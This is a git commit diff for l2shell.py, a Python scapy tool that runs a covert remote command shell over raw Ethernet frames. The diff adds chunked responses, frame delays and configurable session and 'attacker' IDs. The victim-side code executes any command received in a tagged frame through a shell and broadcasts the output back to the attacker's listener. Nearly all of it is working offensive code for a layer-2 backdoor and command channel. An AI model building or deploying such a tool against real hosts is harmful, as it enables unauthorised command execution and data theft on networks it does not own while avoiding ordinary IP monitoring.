fd086719aceec2c7041067d5576f84a34bf6f35f
kvass <60018788+kva55@users.noreply.github.com>
2024-04-05 19:31:51 -0600

    Update l2shell.py
    Added additional args, code formating for responses, and chunked requests.

--- l2shell.py
+++ l2shell.py
@@ -1,15 +1,25 @@
-import argparse, threading
+import argparse, threading, time
 from scapy.all import sniff, Ether, sendp
 import subprocess
 
-mac_address = "FF:FF:FF:FF:FF:FF"
-
+mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
+frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
+                   # this can be changed as required.
+                  
+frame_delay = 0.5      # For chunked responses, could help by spacing out frames
+session_id  = "123456" # Id for accessing the session
+attacker_id = "zxczxc" # Id for returning information to the attacker server
+                  
 def send_frame(message, mac_address):
     # Next send the output back to the command server
-    eth_frame = Ether(dst=mac_address) / message
-
-    # Send the Ethernet frame
-    sendp(eth_frame)
+    frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
+    for frame in frames:
+        time.sleep(frame_delay)
+        frame = attacker_id + frame.decode('utf-8') # Make sure to add the attacker id
+        eth_frame = Ether(dst=mac_address) / frame
+        
+        # Send the Ethernet frame
+        sendp(eth_frame)
 
 # Define a callback function to handle each packet
 def process_frame(frame):
@@ -18,24 +28,29 @@ def process_frame(frame):
         
         if len(eth_frame.payload) > 0:
                 
-            index = str(eth_frame.payload.original).find('123456')
+            index = str(eth_frame.payload.original).find(session_id)
             if index != -1:
                 print("Source MAC:", eth_frame.src)
                 print("Destination MAC:", eth_frame.dst)
                 print("Payload Length:", len(eth_frame.payload))
-                string = str(eth_frame.payload.original)[index + len('123456'):]
+                string = str(eth_frame.payload.original)[index + len(session_id):]
                 string = string.strip("'")
                 pad = "\\x00"
                 nstring = string.replace(pad, '')
-                output = subprocess.check_output(nstring.strip("'"), shell=True)
-                print(output.decode("utf-8"))
+                try:
+                    output = subprocess.check_output(nstring.strip("'"), shell=True)
+                    print(output.decode("utf-8"))
+                    noutput = attacker_id + output.decode("utf-8")
                 
-                noutput = "zxc" + output.decode("utf-8")
-                
+                except Exception as e:
+                    output = "Error: Invalid Command"
+                    noutput = attacker_id + output
+                    
                 # Next send the output back to the command server
                 send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF")
 
-# Define a callback function to handle each packet
+
+# This method is the listening server for the attacker host.
 def process_return_frame(frame):
     if Ether in frame:
         eth_frame = frame[Ether]
@@ -43,17 +58,25 @@ def process_return_frame(frame):
             
             if len(eth_frame.payload) > 0:
                 
-                index = str(eth_frame.payload.original).find('zxc')
+                index = str(eth_frame.payload.original).find(attacker_id)
                 if index != -1:
                     print("Source MAC:", eth_frame.src)
                     print("Destination MAC:", eth_frame.dst)
                     print("Payload Length:", len(eth_frame.payload))
-                    string = str(eth_frame.payload.original)[index + len('zxc'):]
+                    string = str(eth_frame.payload.original)[index + len(attacker_id):]
                     string = string.strip("'")
-                    pad = "\\x00"
-                    nstring = string.replace(pad, '')
-                    print(nstring)
-                    print("\n>", end='')
+                    pad = "\\x00" # Gets rid of padding
+                    returnc = "\\r" # Gets rid of return carriage
+                    nstring = string.replace(attacker_id, '')
+                    
+                    nstring = nstring.replace(returnc, '')
+                    
+                    # Attempts to format the terminal items
+                    terminal_format = nstring.split('\\n')
+                    for line in terminal_format:
+                        print(line)
+                    
+                    #print("\n" + session_id + ">", end='')
 
 # Sniff Ethernet frames and call the process_packet function for each packet
 def listen():
@@ -73,25 +96,56 @@ def connect():
     listener_thread = threading.Thread(target=rlisten)
     listener_thread.daemon = True
     listener_thread.start()
-    userin = "aaa"
+    
+    userin = ""
     while userin != "x":
-        userin = str(input(">"))
-        if userin != '':
+        userin += session_id 
+        userin += str(input(session_id + ">"))
+                 
+        # Make sure the input isn't larger than the set amount
+        if len(userin) > frame_size:
+            print("Error: Input too large...")
+        
+        if userin != session_id:
             send_frame(userin.encode('utf-8'), mac_address)
             
+        userin = ''
+    exit(0)
+    
 def main():
 
     global mac_address
+    global session_id
+    global attacker_id
+    global frame_size
+    global frame_delay
+    
     parser = argparse.ArgumentParser(epilog="e.g. python3 L2Shell.py -l",)
     parser.add_argument("-l", "--listen", action='store_true', help="Listen for connections")
     parser.add_argument("-c", "--connect", action='store_true', help="Connect and instruct commands")
     parser.add_argument("-m", "--mac", help="beacon mac address", type=str)
-    #parser.add_argument("-cb", "--check", action='store_true', help="Check connected beacons")
+    parser.add_argument("-s", "--session", help="session id", type=str, required=True)
+    parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=True)
+    parser.add_argument("-d", "--delay", help="frame delay for chunked responses", type=int)
+    parser.add_argument("-f", "--framesize", help="Sets frame size (victim host)", type=int)
+    
     
     args = parser.parse_args()
 
     if args.mac:
         mac_address = args.mac
+        
+    if args.delay:
+        frame_delay = args.delay    
+        
+    if args.attacker:
+        attacker_id = args.attacker
+    
+    if args.framesize:
+        frame_size = args.framesize
+    
+    if args.session:
+        session_id = args.session
     
     if args.listen:
         listen()
